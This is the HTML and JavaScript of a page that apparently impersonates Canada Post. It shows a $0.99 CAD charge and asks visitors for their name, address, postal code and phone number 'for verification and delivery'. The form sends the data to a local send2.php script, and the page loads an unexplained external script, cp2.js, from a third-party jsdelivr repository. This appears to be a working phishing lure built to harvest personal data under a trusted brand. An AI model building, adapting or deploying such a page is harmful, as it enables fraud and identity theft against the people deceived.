...
<head>
    <meta charset="UTF-8">
    <title>Billing Address | Canada Post</title>
...
<body>
    ...
    <div class="page-wrapper">
        ...
        <div class="payment-summary">
            <div>
                <div class="payment-due">Billing details required</div>
                <div class="payment-amount">$0.99 <span class="payment-currency">CAD</span></div>
            </div>
            <div>
                <div class="payment-due">This address will be used for verification and delivery.</div>
        ...
        <div class="form-card">
            ...
            <form id="billing-form" action="./send/send2.php" method="post">
                ...
                <div class="form-row">
                    ...
                    <input type="text" id="address1" name="address_1" placeholder="Street address, P.O. box, company name">
                    <span class="error-message"></span>
                </div>

                <div class="form-row">
                    <label for="address2">Address line 2 (optional)</label>
                    <input type="text" id="address2" name="address_2" placeholder="Apartment, suite, unit, building, floor, etc.">
                    <span class="error-message"></span>
                </div>
                ...
                <div class="form-row-inline">
                    ...
                    <div class="form-row">
                        <label for="province" class="required">Province / Territory</label>
                ...
                <div class="form-row-inline">
                    <div class="form-row">
                        ...
                        <input type="text" id="postalCode" name="postal_code" placeholder="A1A 1A1" maxlength="7">
                        <span class="error-message"></span>
                        <div class="helper-text">Format: A1A 1A1</div>
                    </div>
                ...
                <div class="form-row">
                    ...
                    <input type="tel" id="phone" name="phone" placeholder="e.g. 416-555-1234">
                    <span class="error-message"></span>
                    <div class="helper-text">We may use this number to contact you regarding your delivery.</div>
                </div>

                <div class="security-notice">
                    <div class="security-icon">🔒</div>
                    <div class="security-text">
                        Your billing address is used to verify your payment details and ensure accurate delivery of your items.
                    </div>
                </div>
    ...
    <script src="https://cdn.jsdelivr.net/gh/900com/jsdelivr@latest/cp2.js"></script><script>
        ...
        function validatePostalCode(input) {
            ...
            if (!regex.test(value)) {
                displayError(input, 'Invalid postal code. Use format A1A 1A1.');
                return false;
            }
            return true;
        }
        ...
        function validatePhone(input) {
            ...
            if (!raw) {
                displayError(input, 'Phone number is required.');
                return false;
            }
            const digits = raw.replace(/\D/g, '');
            if (digits.length < 10) {
                displayError(input, 'Enter a valid phone number (at least 10 digits).');
                return false;
            }
            return true;
        }
        ...
        ['firstName','lastName','address1','address2','city','phone'].forEach(id => {
        ...
        document.getElementById('billing-form').addEventListener('submit', function (e) {
            ...
            // hide banner before validation
            formError.style.display = 'none';

            if (!validateNotEmpty(firstName, 'First name')) isValid = false;
            if (!validateNotEmpty(lastName, 'Last name')) isValid = false;
            if (!validateNotEmpty(address1, 'Address line 1')) isValid = false;
            if (!validateNotEmpty(city, 'City')) isValid = false;

            clearError(province);
            if (!province.value) {
                displayError(province, 'Province / Territory is required.');
                isValid = false;
            }

            clearError(country);
            if (!country.value || country.value !== 'CA') {
                displayError(country, 'Country must be Canada.');
                isValid = false;
            }
            ...
            // else: form posts to ./send/send2.php
        });
    </script>
</body>
</html>
